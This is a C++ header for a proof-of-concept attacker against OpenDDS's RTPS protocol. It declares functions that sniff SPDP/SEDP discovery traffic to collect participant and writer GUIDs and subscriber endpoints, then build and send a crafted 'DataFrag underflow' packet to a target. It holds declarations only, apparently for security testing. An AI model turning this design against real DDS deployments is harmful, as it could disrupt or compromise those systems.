/*
 * Distributed under the OpenDDS License.
 * See: http://www.opendds.org/license.html
 */

#ifndef POCATTACKER_H
#define POCATTACKER_H

#include <dds/DCPS/GuidUtils.h>
#include <vector>
#include <string>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class POCAttacker
{
public:
  POCAttacker();
  ~POCAttacker();

  // Start listening for SPDP packets to extract Participant GUIDs
  // port: SPDP multicast port (default 7400)
  // multicast_addr: SPDP multicast address (default "239.255.0.1")
  bool startGUIDListener(int port = 7400, const char* multicast_addr = "239.255.0.1");

  // Stop SPDP GUID listener
  void stopGUIDListener();

  // Start listening for SEDP packets to extract DataWriter GUIDs (Publisher GUIDs)
  // port: SEDP multicast port (default 7401)
  // multicast_addr: SEDP multicast address (default "239.255.0.1")
  bool startSEDPListener(int port = 7401, const char* multicast_addr = "239.255.0.1");

  // Stop SEDP listener
  void stopSEDPListener();

  // Generate POC data packet
  std::vector<char> generateDataFragUnderflowPacket(int seq_num, 
                                                     const OpenDDS::DCPS::GUID_t* target_guid = nullptr);

  // Send POC packet
  bool sendPOCPacket(const std::vector<char>& packet, 
                     const std::string& target_ip = "127.0.0.1",
                     int target_port = 7411);

  // Get discovered Participant GUIDs
  std::vector<OpenDDS::DCPS::GUID_t> getDiscoveredParticipantGUIDs() const { return discovered_participant_guids_; }
  
  // Get discovered DataWriter GUIDs (Publisher GUIDs)
  std::vector<OpenDDS::DCPS::GUID_t> getDiscoveredWriterGUIDs() const { return discovered_writer_guids_; }
  
  // Get discovered Subscriber address and port (DataReader endpoint)
  std::string getDiscoveredSubscriberAddress() const { return discovered_subscriber_address_; }
  int getDiscoveredSubscriberPort() const { return discovered_subscriber_port_; }
  
  // Convert GUID to string for display
  std::string guidToString(const OpenDDS::DCPS::GUID_t& guid);

private:
  // Extract Participant GUID from RTPS header
  bool extractParticipantGUIDFromHeader(const char* data, size_t len, OpenDDS::DCPS::GUID_t& guid);

  // Extract DataWriter GUIDs from SEDP messages
  bool extractDataWriterGUIDsFromSEDP(const char* data, size_t len, std::vector<OpenDDS::DCPS::GUID_t>& writer_guids);
  
  // Extract Subscriber endpoint (address and port) from SEDP messages
  void extractSubscriberEndpointFromSEDP(const char* data, size_t len);
  
  // Extract Subscriber endpoint (address and port) from SPDP messages
  void extractSubscriberEndpointFromSPDP(const char* data, size_t len);

  // Generate RTPS header
  void generateRTPSHeader(std::vector<char>& rtps_message, const OpenDDS::DCPS::GUID_t* target_guid);

  // Generate UTC timestamp
  void generateUTCTimestamp(char* timestamp);

  int listener_socket_;           // SPDP listener socket
  int sedp_listener_socket_;       // SEDP listener socket
  bool listener_running_;          // SPDP listener running flag
  bool sedp_listener_running_;     // SEDP listener running flag
  std::vector<OpenDDS::DCPS::GUID_t> discovered_participant_guids_;  // Participant GUIDs from SPDP
  std::vector<OpenDDS::DCPS::GUID_t> discovered_writer_guids_;      // DataWriter GUIDs from SEDP
  std::string discovered_subscriber_address_;                        // Subscriber address (multicast or unicast)
  int discovered_subscriber_port_;                                  // Subscriber port (dynamic)
  OpenDDS::DCPS::GUID_t local_guid_prefix_;
};

#endif /* POCATTACKER_H */

